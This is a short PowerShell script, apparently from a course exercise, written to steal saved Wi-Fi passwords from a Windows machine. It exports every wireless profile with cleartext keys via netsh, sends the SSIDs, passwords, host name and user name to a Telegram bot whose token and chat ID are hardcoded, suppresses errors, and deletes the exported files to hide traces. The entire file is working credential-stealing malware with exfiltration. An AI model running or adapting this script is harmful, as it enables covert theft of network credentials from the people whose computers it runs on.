# ============================================================
#  W02a.6 - WLAN-Passwoerter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── WLAN-Passwoerter sammeln ──────────────────────────────────

Send-TgMessage "[WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"

# Export explicitly to TEMP so the script works from any working directory (incl. System32)
$exportFolder = $env:TEMP
netsh wlan export profile key=clear folder="$exportFolder" | Out-Null

try {
    $xmlFiles = Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue

    if ($xmlFiles) {
        $passwords = $xmlFiles | ForEach-Object {
            $xml  = [xml](Get-Content $_.FullName -Raw)
            $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
            $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
            if ($pass) { "SSID: $ssid  |  Passwort: $pass" }
            else        { "SSID: $ssid  |  (offen / kein Passwort)" }
        }
    } else {
        $passwords = @("(keine WLAN-Profile mit Passwort gefunden)")
    }

    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
              ($passwords -join "`n")

    Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
                -Content $report `
                -Caption "WiFi Passwords - $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
} finally {
    # Clean up exported XML files
    Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
}
